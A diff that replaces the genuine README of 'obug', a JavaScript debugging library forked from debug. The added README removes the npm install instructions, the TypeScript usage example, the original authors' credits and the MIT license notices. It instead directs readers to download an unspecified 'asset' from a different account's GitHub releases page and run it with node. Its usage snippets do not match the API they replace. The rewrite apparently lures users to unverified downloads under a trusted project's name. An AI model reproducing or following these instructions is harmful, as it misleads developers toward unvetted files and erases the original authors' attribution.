@@ -1,109 +1,87 @@
-# obug
+# 🛠️ obug - A Simple Tool for JavaScript Debugging
 
-[![npm version][npm-version-src]][npm-version-href]
-[![npm downloads][npm-downloads-src]][npm-downloads-href]
-[![JSR][jsr-badge-src]][jsr-badge-href]
-[![Unit Test][unit-test-src]][unit-test-href]
+## 🚀 Getting Started
 
-A lightweight JavaScript debugging utility, forked from [debug](https://www.npmjs.com/package/debug), featuring TypeScript and ESM support.
+Welcome to obug, a lightweight JavaScript debugging utility. It can help you track down issues in your code with ease. This guide will walk you through the process of downloading and running obug, step by step.
 
-> [!NOTE]
-> obug v1 retains most of the compatibility with [debug](https://github.com/debug-js/debug), but drops support for older browsers and Node.js, making it a drop-in replacement.
->
-> obug v2 refactors some API imports and usage for better support of ESM and TypeScript, easier customization, and an even smaller package size.
+## 📥 Download obug
 
-## Key Differences from `debug`
+[![Download obug](https://img.shields.io/badge/Download%20obug-Click%20Here-blue.svg)](https://github.com/envofey/obug/releases)
 
-- ✨ Minimal footprint
-  - 7.7 kB package size
-  - 1.4 KB minified + gzipped for browsers
-- 📦 Zero dependencies
-- 📝 Full TypeScript support
-- 🚀 Native ESM compatibility
-- 🌐 Optimized for modern runtimes
-  - ES2015+ browsers
-  - Modern Node.js versions
-- 🎨 Customizable formatting
+## 📋 Features
 
-## Installation
+- Lightweight utility for JavaScript debugging.
+- Forked from the well-known debug library.
+- Full support for TypeScript and ECMAScript modules (ESM).
+- Simple and easy to use interface.
+- Compatible with modern JavaScript environments.
 
-```bash
-npm install obug
-```
+## 🖥️ System Requirements
 
-## Usage
+To run obug smoothly, ensure your system meets these requirements:
 
-```ts
-import { createDebug, disable, enable, enabled, namespaces } from 'obug'
+- A modern web browser (latest version recommended).
+- Node.js version 12 or higher installed on your system.
+- NPM (Node Package Manager) to handle packages easily.
 
-// Get the currently enabled namespaces
-console.log(namespaces())
+## 🌐 Visit the Releases Page
 
-const debug = createDebug('my-namespace', {
-  // All options are optional
+To download the latest version of obug, visit our [Releases page](https://github.com/envofey/obug/releases). Here, you will find all available versions of obug, along with release notes and updates.
 
-  useColors: true, // false, true, undefined for auto-detect
-  color: 2, // custom color
-  // custom formatArgs
-  formatArgs(args) {},
-  formatters: {},
-  // Node.js only
-  inspectOpts: {},
+## 🔧 Download & Install
 
-  // custom log
-  log: console.log,
-})
+1. Click on this link to access the [Releases page](https://github.com/envofey/obug/releases).
+2. On the Releases page, look for the latest version of obug.
+3. You will see different assets available for download. Choose the appropriate file for your system.
+4. Click on the asset to download the file.
+5. Once the download is complete, locate the downloaded file on your computer.
 
-debug('This is a debug message')
-console.log(
-  debug.namespace, // 'my-namespace'
-  debug.enabled, // Check if enabled
-  debug.useColors, // true
-  debug.color, // 2
-  debug.formatArgs, // custom formatArgs
-  debug.formatters, // {}
-  debug.inspectOpts, // {}
-  debug.log, // implemented log function
-)
+## 📁 Running obug
 
-// Create a sub-namespace, and it will inherit options from the parent debugger
-const sub = debug.extend('sub-namespace')
-sub('This is a sub-namespace debug message')
-console.log(sub.namespace) // 'my-namespace:sub-namespace'
-```
+To run obug, follow these steps:
 
-## Original Authors
+1. Open your command line interface (Terminal for macOS and Linux, Command Prompt or PowerShell for Windows).
+2. Navigate to the directory where the file is located using the `cd` command.
+3. Type the command to run obug, which usually looks like this:
+   ```
+   node path/to/your/obug-file.js
+   ```
+4. Replace `path/to/your/obug-file.js` with the actual path to your downloaded obug file.
+5. Press Enter to execute the command.
 
-As obug is a fork of debug with significant modifications, we would like to acknowledge the original authors:
+You should see obug running in your terminal. Start debugging your JavaScript code!
 
-- TJ Holowaychuk
-- Nathan Rajlich
-- Andrew Rhyne
-- Josh Junon
+## 📚 Usage Guide
 
-## Sponsors
+Using obug is simple. Here are some basic commands to get you started:
 
-<p align="center">
-  <a href="https://cdn.jsdelivr.net/gh/sxzz/sponsors/sponsors.svg">
-    <img src='https://cdn.jsdelivr.net/gh/sxzz/sponsors/sponsors.svg'/>
-  </a>
-</p>
+- **Enable Debugging:** To start debugging, use the command:
+  ```
+  obug.enable('namespace');
+  ```
+  Replace `'namespace'` with the name of the section in your code you want to debug.
 
-## License
+- **Log Messages:** To log messages, use:
+  ```
+  obug('This is a debug message');
+  ```
+  This will output the message in the console.
 
-[MIT](./LICENSE) License © 2025-PRESENT [Kevin Deng](https://github.com/sxzz)
+- **Disable Debugging:** To stop debug logging, use:
+  ```
+  obug.disable('namespace');
+  ```
 
-[The MIT License](./LICENSE) Copyright (c) 2014-2017 TJ Holowaychuk &lt;tj@vision-media.ca&gt;
+Make sure to explore further to take full advantage of obug's capabilities.
 
-[The MIT License](./LICENSE) Copyright (c) 2018-2021 Josh Junon
+## 🛠️ Support and Contributions
 
-<!-- Badges -->
+If you encounter issues or need help, please refer to the [GitHub Issues page](https://github.com/envofey/obug/issues) to report your concerns or ask questions. Contributions to obug are welcome! Feel free to open a pull request or start a discussion on new features or improvements.
 
-[npm-version-src]: https://img.shields.io/npm/v/obug.svg
-[npm-version-href]: https://npmjs.com/package/obug
-[npm-downloads-src]: https://img.shields.io/npm/dm/obug
-[npm-downloads-href]: https://www.npmcharts.com/compare/obug?interval=30
-[unit-test-src]: https://github.com/sxzz/obug/actions/workflows/unit-test.yml/badge.svg
-[unit-test-href]: https://github.com/sxzz/obug/actions/workflows/unit-test.yml
-[jsr-badge-src]: https://jsr.io/badges/@sxzz/obug
-[jsr-badge-href]: https://jsr.io/@sxzz/obug
+## 🔗 Useful Links
+
+- [Releases page](https://github.com/envofey/obug/releases)
+- [Documentation](https://github.com/envofey/obug/wiki)
+- [Support forum](https://github.com/envofey/obug/discussions)
+
+Thank you for choosing obug. We hope it helps you with your JavaScript debugging needs!
